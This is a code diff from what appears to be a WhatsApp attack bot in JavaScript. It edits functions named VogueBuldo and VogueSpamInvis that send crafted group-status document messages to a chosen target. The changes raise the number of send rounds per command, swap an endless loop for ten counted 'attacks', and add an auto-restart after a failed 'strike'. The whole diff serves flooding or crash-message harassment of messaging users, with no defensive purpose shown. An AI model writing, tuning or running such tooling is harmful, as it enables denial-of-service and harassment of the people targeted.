@@ -3596,7 +3596,7 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 1; i++) {
+            for (let i = 0; i < 2; i++) {
                 try {
                     await VogueBuldo(sock, target);
                     await sleep(1500)
@@ -3918,6 +3918,23 @@ Please verify the target input and system status before retrying.`
 //    \____/ \___/ \____/                              
 //                                                     
 //                                                     
+
+async function restartBot(reason = "Unknown") {
+
+    console.log(`
+[VOGUE AUTO RESTART]
+
+Reason : ${reason}
+`);
+
+    try {
+        await destroySocket();
+    } catch {}
+
+    setTimeout(() => {
+        process.exit(1);
+    }, 2000);
+}
 
 async function CheckCooldown(ctx, next) {
     
@@ -4320,8 +4337,9 @@ async function VogueSpamInvis(sock, target) {
 }
 
 async function VogueBuldo(sock, target) {
- while (true) {
-  const MsgNew = {
+    const totalAttack = 10;
+    for (let i = 0; i < totalAttack; i++) {
+        const MsgNew = {
     groupStatusMessageV2: {
       message: {
         documentMessage: {
@@ -4363,6 +4381,7 @@ async function VogueBuldo(sock, target) {
     console.log(`message success to ${target}`);
   } catch (e) {
     console.log("[!] Error Strike:", e);
+    await restartBot("Connection Closed");
   }
 }
 }
